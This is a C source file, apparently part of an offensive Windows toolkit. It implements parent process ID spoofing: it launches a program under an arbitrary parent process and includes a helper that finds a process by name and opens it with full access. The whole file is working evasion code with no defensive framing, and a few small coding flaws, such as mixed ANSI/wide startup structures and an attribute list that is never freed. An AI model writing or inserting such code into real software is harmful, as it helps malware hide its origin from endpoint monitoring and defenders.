#include "PPIDSpoofing.h"

BOOL CreatePPidSpoofedProcess(IN HANDLE hTargetProcess, IN LPCWSTR lpProgramPath ,OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread) {

	STARTUPINFOEXA		SiEx;
	PROCESS_INFORMATION	Pi;
	SIZE_T				attributeSize;

	ZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
	ZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));



	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);

	SiEx.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	if (!SiEx.lpAttributeList)
		return FALSE;
	InitializeProcThreadAttributeList(SiEx.lpAttributeList, 1, 0, &attributeSize);

	UpdateProcThreadAttribute(SiEx.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hTargetProcess, sizeof(HANDLE), NULL, NULL);

	SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

	if (!CreateProcessW(NULL, lpProgramPath, NULL, NULL, 0, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &SiEx.StartupInfo, &Pi))
	{
		HeapFree(GetProcessHeap(), NULL, SiEx.lpAttributeList);
		return FALSE;
	}
	*dwProcessId = Pi.dwProcessId;
	*hProcess = Pi.hProcess;
	*hThread = Pi.hThread;
	return TRUE;
}

BOOL GetRemoteProcessHandle(IN LPWSTR szProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess) {

	PROCESSENTRY32	Proc = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	HANDLE hSnapShot = NULL;

	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	if (!Process32First(hSnapShot, &Proc)) {
		printf("[!] Process32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		WCHAR LowerName[MAX_PATH * 2];

		if (Proc.szExeFile) {
			DWORD	dwSize = lstrlenW(Proc.szExeFile);
			DWORD   i = 0;

			RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

			if (dwSize < MAX_PATH * 2) {

				for (; i < dwSize; i++)
					LowerName[i] = (WCHAR)tolower(Proc.szExeFile[i]);

				LowerName[i++] = '\0';
			}
		}

		if (wcscmp(LowerName, szProcessName) == 0) {
			*dwProcessId = Proc.th32ProcessID;
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());

			break;
		}

	} while (Process32Next(hSnapShot, &Proc));

_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwProcessId == NULL || *hProcess == NULL)
		return FALSE;
	return TRUE;
}